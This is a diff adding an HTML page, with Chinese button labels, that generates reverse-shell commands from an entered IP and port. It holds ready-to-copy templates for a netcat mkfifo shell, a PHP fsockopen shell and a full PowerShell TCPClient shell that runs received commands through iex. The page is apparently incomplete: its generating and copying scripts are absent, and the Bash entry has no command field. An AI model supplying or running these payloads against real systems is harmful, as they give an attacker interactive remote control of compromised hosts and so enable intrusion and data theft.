@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+<body>
+    <fieldset>
+        <legend>Basic input</legend>
+    <b>ip</b>
+    <input type="txt" name="ip" id="ip">
+    <b>port</b>
+    <input type="txt" name="port" id="port">
+    <button  type="button" onclick="create_command()">生成</button>
+    </fieldset>
+
+
+
+    
+		<div class="form-group row">
+			<label class="col-sm-2 col-form-label">Bash</label>
+			
+
+			<button class="btn-success btn" onmouseover="create_command()" onclick ="copy('bash','value')">复制</button>
+		</div>
+
+		<div  class="form-group row">
+			<label class="col-sm-2 col-form-label">Zsh</label>
+			<textarea id="zsh"></textarea>
+			<button class="btn-success btn" onmouseover="create_command()" onclick ="copy('zsh','value')">复制</button>
+		</div>
+
+		<div  class="form-group row">
+			<label class="col-sm-2 col-form-label">NetCat</label>
+			<input type="text" id="netcat" class="form-control col-sm-8" readonly
+			value="rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {{ip}} {{port}} >/tmp/f">
+			<button class="btn-success btn" onmouseover="create_command()" onclick ="copy('netcat','value')">复制</button>
+		</div>
+
+		<div  class="form-group row">
+			<label class="col-sm-2 col-form-label">PHP</label>
+			<input type="text" id="php" class="form-control col-sm-8" readonly
+			value="php -r '$sock=fsockopen(&quot{{ip}}&quot,{{port}});exec(&quot/bin/sh -i <&3 >&3 2>&3&quot);'">
+			<button class="btn-success btn"onmouseover="create_command()" onclick ="copy('php','value')">复制</button>
+		</div>
+
+		<div  class="form-group row">
+			<label class="col-sm-2 col-form-label">PowerShell</label>
+			<input type="text" id="powershell" class="form-control col-sm-8" readonly
+			value="powershell -nop -c &quot$client = New-Object System.Net.Sockets.TCPClient(&quot{{ip}}&quot,{{port}});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()&quot">
+			<button class="btn-success btn" onmouseover="create_command()" onclick ="copy('powershell','value')">复制</button>
+		</div>
+    
+</body>
+</html>
